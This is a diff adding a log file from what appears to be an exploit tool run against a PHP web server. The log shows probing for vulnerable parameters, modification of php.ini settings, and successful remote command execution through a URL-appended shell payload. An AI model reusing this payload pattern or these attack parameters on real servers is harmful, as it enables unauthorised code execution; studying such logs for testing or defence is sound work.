@@ -1,0 +1,38 @@
+2026/10/23 11:30:03 Base status code is 301
+2026/10/23 11:30:03 Status code 502 for qsl=1760, adding as a candidate
+2026/10/23 11:30:03 The target is probably vulnerable. Possible QSLs: [1750 1755 1760]
+2026/10/23 11:30:03 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:9}
+2026/10/23 11:30:03 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:11}
+2026/10/23 11:30:03 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:13}
+2026/10/23 11:30:03 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:15}
+2026/10/23 11:30:03 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:17}
+2026/10/23 11:30:03 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:19}
+2026/10/23 11:30:03 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:21}
+2026/10/23 11:30:03 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:23}
+2026/10/23 11:30:03 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:25}
+2026/10/23 11:30:03 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:27}
+2026/10/23 11:30:04 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:29}
+2026/10/23 11:30:04 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:31}
+2026/10/23 11:30:04 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:33}
+2026/10/23 11:30:04 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:35}
+2026/10/23 11:30:04 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:37}
+2026/10/23 11:30:04 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:39}
+2026/10/23 11:30:04 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:41}
+2026/10/23 11:30:04 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:43}
+2026/10/23 11:30:04 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:45}
+2026/10/23 11:30:04 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:47}
+2026/10/23 11:30:04 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:49}
+2026/10/23 11:30:04 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:51}
+2026/10/23 11:30:04 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:53}
+2026/10/23 11:30:04 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:55}
+2026/10/23 11:30:04 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:57}
+2026/10/23 11:30:04 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:59}
+2026/10/23 11:30:04 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:61}
+2026/10/23 11:30:04 Status code 200 for &main.AttackParams{QueryStringLength:1750, PisosLength:63}
+2026/10/23 11:30:04 Attack params found: --qsl 1750 --pisos 64 --skip-detect
+2026/10/23 11:30:04 Trying to set "session.auto_start=0"...
+2026/10/23 11:30:04 Detect() returned attack params: --qsl 1750 --pisos 64 --skip-detect <-- REMEMBER THIS
+2026/10/23 11:30:04 Performing attack using php.ini settings...
+2026/10/23 11:30:04 Success! Was able to execute a command by appending "?a=/bin/sh+-c+'which+which'&" to URLs
+2026/10/23 11:30:04 Trying to cleanup /tmp/a...
+rc=124
